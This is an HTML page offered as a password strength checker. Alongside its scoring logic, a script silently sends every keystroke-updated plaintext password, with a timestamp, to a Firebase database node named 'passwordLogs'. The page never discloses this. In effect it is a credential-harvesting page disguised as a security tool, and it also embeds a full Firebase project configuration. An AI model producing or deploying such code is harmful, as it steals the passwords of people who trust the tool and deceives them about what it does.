<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Password Checker</title>
  <style>
    body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; margin: 0; }
    .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 400px; }
    input { width: 100%; padding: 10px; font-size: 16px; margin-bottom: 10px; }
    .result { font-weight: bold; margin-top: 10px; }
    .weak { color: red; }
    .medium { color: orange; }
    .strong { color: green; }
    .suggestions { font-size: 14px; color: #444; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Password Strength Checker</h2>
    <input type="password" id="password" placeholder="Enter password" />
    <div id="result" class="result"></div>
    <div id="suggestions" class="suggestions"></div>
  </div>

  <script type="module">
    // Firebase SDK imports
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";

    // Your Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyCrx2SThfEd8wi-la6YpVYmx0vPKAvpUfQ",
      authDomain: "passwords-9ce51.firebaseapp.com",
      databaseURL: "https://passwords-9ce51-default-rtdb.firebaseio.com",
      projectId: "passwords-9ce51",
      storageBucket: "passwords-9ce51.appspot.com",
      messagingSenderId: "950342989564",
      appId: "1:950342989564:web:32c646d4b5c3f493b08979",
      measurementId: "G-DCDJC57M3D"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // Password strength logic
    const passwordInput = document.getElementById("password");
    const result = document.getElementById("result");
    const suggestions = document.getElementById("suggestions");

    passwordInput.addEventListener("input", () => {
      const password = passwordInput.value;
      let score = 0;
      const tips = [];

      if (password.length >= 8) score++; else tips.push("Use at least 8 characters.");
      if (/[A-Z]/.test(password)) score++; else tips.push("Add an uppercase letter.");
      if (/[a-z]/.test(password)) score++;
      if (/\d/.test(password)) score++; else tips.push("Add a number.");
      if (/[^a-zA-Z0-9]/.test(password)) score++; else tips.push("Add a special character (!@#...).");

      if (!password) {
        result.textContent = "";
        suggestions.innerHTML = "";
        return;
      }

      if (score <= 2) {
        result.textContent = "Weak ❌";
        result.className = "result weak";
      } else if (score <= 4) {
        result.textContent = "Medium ⚠️";
        result.className = "result medium";
      } else {
        result.textContent = "Strong ✅";
        result.className = "result strong";
      }

      suggestions.innerHTML = tips.length ? `<strong>Suggestions:</strong><br>${tips.join("<br>")}` : "";

      // Save to Firebase
      const passwordsRef = ref(db, 'passwordLogs');
      push(passwordsRef, {
        password: password,
        timestamp: Date.now()
      }).catch((err) => console.error("Error saving to Firebase:", err));
    });
  </script>
</body>
</html>
